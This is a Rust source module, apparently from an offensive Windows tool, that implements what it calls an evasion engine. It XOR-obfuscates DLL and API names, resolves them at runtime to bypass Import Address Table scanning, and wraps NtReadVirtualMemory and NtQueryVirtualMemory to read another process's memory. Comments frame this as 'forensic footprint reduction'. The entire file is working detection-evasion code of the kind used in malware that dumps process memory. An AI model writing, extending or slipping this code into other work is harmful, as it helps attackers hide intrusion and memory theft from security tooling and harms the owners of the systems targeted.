//! syscaller.rs — Direct Syscall engine and Dynamic API resolution for evasion.
//! (Red Audit Remediation - L0/L1)

use crate::obfuscate;
use crate::xor_str;
#[cfg(target_arch = "x86_64")]
use std::arch::asm;
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};

/// Custom handle wrapper for RAII-based closure (Forensic footprint reduction)
pub struct SafeHandle(pub HANDLE);

impl Drop for SafeHandle {
    fn drop(&mut self) {
        if self.0 != 0 && self.0 != -1 {
            unsafe {
                // Dynamic resolution for CloseHandle (Obfuscated with Polymorphic Key)
                const K32: [u8; 12] = xor_str!("kernel32.dll", obfuscate::POLY_XOR_KEY);
                const CH: [u8; 11] = xor_str!("CloseHandle", obfuscate::POLY_XOR_KEY);

                let close_handle = Resolve::api::<unsafe extern "system" fn(HANDLE) -> i32>(
                    &obfuscate::decrypt(&K32, obfuscate::POLY_XOR_KEY),
                    &obfuscate::decrypt(&CH, obfuscate::POLY_XOR_KEY),
                );
                if let Some(f) = close_handle {
                    f(self.0);
                }
            }
        }
    }
}

/// Refactored Indirect Syscall (Dynamic NT API Resolution)
/// Replaces brittle hardcoded inline asm syscalls with dynamic IAT-free fetching.
pub unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base_address: *const std::ffi::c_void,
    buffer: *mut std::ffi::c_void,
    buffer_size: usize,
    number_of_bytes_read: *mut usize,
) -> NTSTATUS {
    const NTDLL: [u8; 9] = xor_str!("ntdll.dll", obfuscate::POLY_XOR_KEY);
    const NRVM: [u8; 19] = xor_str!("NtReadVirtualMemory", obfuscate::POLY_XOR_KEY);

    let func = Resolve::api::<
        unsafe extern "system" fn(
            HANDLE,
            *const std::ffi::c_void,
            *mut std::ffi::c_void,
            usize,
            *mut usize,
        ) -> NTSTATUS,
    >(
        &obfuscate::decrypt(&NTDLL, obfuscate::POLY_XOR_KEY),
        &obfuscate::decrypt(&NRVM, obfuscate::POLY_XOR_KEY),
    );

    if let Some(f) = func {
        f(
            process_handle,
            base_address,
            buffer,
            buffer_size,
            number_of_bytes_read,
        )
    } else {
        -1 // Fallback generic error
    }
}

/// Refactored Indirect Syscall (Dynamic NT API Resolution)
pub unsafe fn nt_query_virtual_memory(
    process_handle: HANDLE,
    base_address: *const std::ffi::c_void,
    memory_information_class: i32,
    memory_information: *mut std::ffi::c_void,
    memory_information_length: usize,
    return_length: *mut usize,
) -> NTSTATUS {
    const NTDLL: [u8; 9] = xor_str!("ntdll.dll", obfuscate::POLY_XOR_KEY);
    const NQVM: [u8; 20] = xor_str!("NtQueryVirtualMemory", obfuscate::POLY_XOR_KEY);

    let func = Resolve::api::<
        unsafe extern "system" fn(
            HANDLE,
            *const std::ffi::c_void,
            i32,
            *mut std::ffi::c_void,
            usize,
            *mut usize,
        ) -> NTSTATUS,
    >(
        &obfuscate::decrypt(&NTDLL, obfuscate::POLY_XOR_KEY),
        &obfuscate::decrypt(&NQVM, obfuscate::POLY_XOR_KEY),
    );

    if let Some(f) = func {
        f(
            process_handle,
            base_address,
            memory_information_class,
            memory_information,
            memory_information_length,
            return_length,
        )
    } else {
        -1 // Fallback generic error
    }
}

/// Dynamic API Resolution to bypass IAT (Import Address Table) scanning.
pub struct Resolve;

impl Resolve {
    /// Resolves a procedure address without static linking.
    pub unsafe fn api<T>(module: &str, function: &str) -> Option<T> {
        use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

        let mod_cstr = std::ffi::CString::new(module).ok()?;
        let func_cstr = std::ffi::CString::new(function).ok()?;

        let h_mod = GetModuleHandleA(mod_cstr.as_ptr() as *const u8);
        if h_mod == 0 {
            return None;
        }

        let addr = GetProcAddress(h_mod, func_cstr.as_ptr() as *const u8);
        addr.map(|f| std::mem::transmute_copy(&f))
    }
}
